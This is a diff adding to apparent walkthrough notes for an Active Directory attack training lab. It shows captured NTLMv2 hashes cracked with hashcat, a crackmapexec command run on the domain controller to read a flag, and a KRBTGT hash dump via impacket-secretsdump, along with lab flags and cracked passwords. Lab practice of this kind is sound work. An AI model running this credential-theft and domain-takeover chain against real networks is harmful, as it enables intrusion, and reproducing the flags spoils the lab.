@@ -616,3 +616,69 @@ exc3ss1ve_adm1n_r1ights!
 Found CT059 has `GenericAll` to Domain Admins.
 
 ![](../screenshots/CT059_generic_all.png)
+
+Got NTLMv2 hashes via Inveigh. See [inveigh dump](./Inveight_administrator_dump.txt) and [inveigh ntlm_v2 hashes](./Inveigh_NTLMV2_admin_dump.txt)
+
+
+**Cracked the hashes using hashcat and rockyou wordlist**
+
+```
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+CT059::INLANEFREIGHT:4d5eb07a0d6d4242:2e711130fc085f7cf9fb809673d0b7f1:010100000000000047fbec18ccd9dc01032b7f8cde3b6ea60000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000700080047fbec18ccd9dc0106000400020000000800300030000000000000000000000000200000fb0850da4373ffb7f538e31cc27fe84957b12fbce030b07b07a84c21150f5f540a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000:charlie1
+AB920::INLANEFREIGHT:e58420c01eee133e:7b1331980d561a93f3c79e8650e1c5ea:010100000000000039d8011fccd9dc0173882a10d05b20340000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000700080039d8011fccd9dc0106000400020000000800300030000000000000000000000000200000fb0850da4373ffb7f538e31cc27fe84957b12fbce030b07b07a84c21150f5f540a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: /home/openclaw/.openclaw/workspace-neo/htb/academy/ad-enumeration-attacks/part2/raw_data/Inveigh_NTLMV2_admin_dump.txt
+Time.Started.....: Sat May  2 09:52:22 2026 (1 sec)
+Time.Estimated...: Sat May  2 09:52:23 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:   598.0 kH/s (2.99ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
+Progress.........: 579584/28688770 (2.02%)
+Rejected.........: 0/579584 (0.00%)
+Restore.Point....: 288768/14344385 (2.01%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: winers -> temyong
+
+Started: Sat May  2 09:52:20 2026
+Stopped: Sat May  2 09:52:24 2026
+```
+
+## DC01 enum
+
+**Got flag**
+
+```
+┌──(openclaw㉿srv1405873)-[~]
+└─$ crackmapexec smb 172.16.7.3 -u CT059 -p 'charlie1' -x "type C:\Users\Administrator\Desktop\flag.txt"
+SMB         172.16.7.3      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.7.3      445    DC01             [+] INLANEFREIGHT.LOCAL\CT059:charlie1 (Pwn3d!)
+SMB         172.16.7.3      445    DC01             [+] Executed command
+SMB         172.16.7.3      445    DC01             acLs_f0r_th3_w1n!
+```
+
+**Got KRBTGT hash**
+
+```
+└─$ impacket-secretsdump INLANEFREIGHT.LOCAL/CT059:charlie1@172.16.7.3 -just-dc-user KRBTGT
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91
+krbtgt:aes128-cts-hmac-sha1-96:e1fe1e9e782036060fb7cbac23c87f9d
+krbtgt:des-cbc-md5:e0a7fbc176c28a37
+[*] Cleaning up...
+```
